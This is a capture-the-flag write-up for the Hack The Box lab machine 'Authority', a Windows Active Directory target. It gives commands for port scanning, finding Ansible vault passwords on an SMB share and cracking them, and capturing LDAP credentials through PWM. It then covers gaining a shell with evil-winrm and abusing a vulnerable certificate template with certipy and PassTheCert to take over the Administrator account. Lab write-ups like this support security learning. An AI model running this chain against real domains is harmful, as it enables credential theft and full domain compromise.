# Authority

### Reconnaissance

22/tcp filtered ssh
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-15 12:19:34Z)
111/tcp filtered rpcbind
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
554/tcp filtered rtsp
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open ssl/https-alt
9389/tcp open mc-nmf .NET Message Framing
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49664/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49673/tcp open msrpc Microsoft Windows RPC
49688/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49689/tcp open msrpc Microsoft Windows RPC
49691/tcp open msrpc Microsoft Windows RPC
49692/tcp open msrpc Microsoft Windows RPC
49701/tcp open msrpc Microsoft Windows RPC
49703/tcp open msrpc Microsoft Windows RPC
49715/tcp open msrpc Microsoft Windows RPC
60854/tcp open msrpc Microsoft Windows RPC

**HTTP**

port 80 displays the standard IIS landing page
port 593 RPC over HTTP
port 5985 API endpoint
port 8443 displays a login portal for PWM and a message:
```
PWM is currently in configuration mode. This mode allows updating the configuration without authenticating 
to an LDAP directory first. End user functionality is not available in this mode.

After you have verified the LDAP directory settings, use the Configuration Manager to restrict the 
configuration to prevent unauthorized changes. After restricting, the configuration can still be changed but 
will require LDAP directory authentication first.
```

**SMB**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Department Shares Disk      
Development     Disk      
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Development share contains Ansible yml files, download the files and use `grep -r -i pass Development` to 
find passwords

**PWM**

https://github.com/pwm-project/pwm

Found main.yaml containing Ansible vault passwords in SMB share 

Cracked Ansible vault password (remember to remove the filename prefix + : from the output of ansible2john)

```
ansible2john vault-hash.txt > hash.txt
# remove the file name and : from hash.txt before running hashcat/john

hashcat -m 16900 -O -a 0 -w 4 --session=vault hash.txt /usr/share/wordlists/rockyou.txt
john --format=ansible --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Decrypt the vault passwords with ansible-vault and enter the cracked password when prompted

`cat vault-hash.txt | ansible-vault decrypt`

Use the test LDAP profile function in PWM to send the LDAP credentials in plaintext (remember to use ldap://)

Output from test LDAP Profile:
`CN=LDAP_user,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�Password`

### Exploitation

crackmapexec shows winrm is available for the LDAP credentials recovered:

`crackmapexec winrm -u LDAP_user -p password 10.10.11.222`

Use evil-winrm and the recovered LDAP credentials to gain a remote shell on the target and access to user.txt
(the shell blocks NetBIOS which affects certificate requests later)

`evil-winrm -i 10.10.11.222 -u LDAP_user -p 'password'`

### Privilege Escalation

Template[8] -> not authorized to enroll, maybe need to do more for this?

Needed to add a user with impacket-addcomputer to request the vulnerable template

`impacket-addcomputer authority.htb/LDAP_user:'ldap_pass' -computer-name username -computer-pass password`

We can then use certipy to request the vulnerable template (-dns is found in the PWM panel, in the test LDAP 
profile section and -upn is the default Windows administrator account and the domain)

`certipy-ad req -username username$ -password password -cs AUTHORITY-CA -target authority.htb -template VulnTemplate -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.1`

This gives us an administrator certificate which we can use to request a cert and key

```
certipy-ad cert -pfx adminstrator_authority.pfx -nokey -out user.crt
certipy-ad cert -pfx adminstrator_authority.pfx -nocert -out user.key
```

Use PassTheCert to change the Administrator account's password

`python3 passthecert.py -action ldap-shell -target administrator -dc-ip 10.10.11.222 -crt ~/htb/machines/authority/user.crt -key ~/htb/machines/authority/user.key`

Log in as Administrator with evil-winrm for root.txt
